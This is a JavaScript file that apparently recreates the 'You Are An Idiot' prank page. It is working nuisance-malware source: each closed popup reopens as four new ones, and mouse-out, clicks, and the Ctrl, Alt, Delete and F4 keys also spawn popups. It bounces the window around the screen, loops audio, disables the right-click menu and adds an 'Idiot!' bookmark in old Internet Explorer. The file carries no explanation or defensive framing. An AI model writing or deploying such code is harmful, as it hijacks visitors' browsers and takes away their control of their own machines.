function checkAndRedirect() {
    if (document.hasFocus() && !window.location.pathname.includes('/lol.html')) {
        window.location.href = 'lol.html';
    }
}
checkAndRedirect();
window.addEventListener('focus', checkAndRedirect);
document.addEventListener('click', function playMusicOnce() {  
    const audio = document.getElementById('youare-audio');  
    const micon = document.getElementById('youare-micon');  
  
    if (!audio || !micon) return;  
  
    document.removeEventListener('click', playMusicOnce);  
}, { once: true });  
  
const faudio = new Audio('media/youare.mp3');  
faudio.addEventListener('timeupdate', function () {  
    if (this.currentTime > this.duration - 0.45) {  
        this.currentTime = 0;  
        this.play();  
    }  
});  
function bookmark() {  
    if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {  
        window.external.AddFavorite("lol.html", "‎‎Idiot!");  
    }  
}  
  
const openWindows = [];  
let mouseX = 0;  
let mouseY = 0;  
  
document.addEventListener("mousemove", e => {  
    mouseX = e.clientX;  
    mouseY = e.clientY;  
});  
function openWindow(url) {
    const width = 357;
    const height = 330;

    const left = Math.floor((screen.width - width) / 2);
    const top = Math.floor((screen.height - height) / 2);

    const features =
        `menubar=no,status=no,toolbar=no,resizable=no,` +
        `width=${width},height=${height},left=${left},top=${top},` +
        `noopener,noreferrer`;

    const aWindow = window.open(url, "_blank", features);

    if (aWindow) {
        openWindows.push(aWindow);

        const timer = setInterval(() => {
            for (let i = openWindows.length - 1; i >= 0; i--) {
                if (openWindows[i].closed) {
                    openWindows.splice(i, 1);
                }
            }

            if (aWindow.closed) {
                clearInterval(timer);
                proCreate();
            }

        }, 40);
    }
} 
  
function proCreate() {  
    for (let i = 0; i < 4; i++) {  
        openWindow('lol.html');  
    }  
}  
  
  
let xOff = 8, yOff = 8;  
let xPos = 400, yPos = -100;  
let flagRun = 1;  
  
function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }  
function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }  
function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }  
function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }  
  
function fOff() { flagRun = 0; }  
  
function playBall() {  
    xPos += xOff;  
    yPos += yOff;  
    if (xPos > screen.width - 357) newXlt();  
    if (xPos < 0) newXrt();  
    if (yPos > screen.height - 330) newYup();  
    if (yPos < 0) newYdn();  
    if (flagRun === 1) {  
        try {  
            window.moveTo(xPos, yPos);  
        } catch (e) {  
            flagRun = 0;  
        }  
        setTimeout(playBall, 16);  
    }  
}  
  
window.onload = function () {  
    flagRun = 1;  
    playBall();  
    bookmark();  
};  
  
window.onmouseout = function () {  
    proCreate();  
}; 
window.onclick = function() {
    proCreate();
};
  
window.oncontextmenu = function () {  
    return false;
};  
  
window.onkeydown = function (event) {  
    const keyCode = event.keyCode;  
    if ([17, 18, 46, 115].includes(keyCode)) {  
        proCreate();  
    }  
};  
  
//window.onbeforeunload = function () {  
//    return " "; 
//};
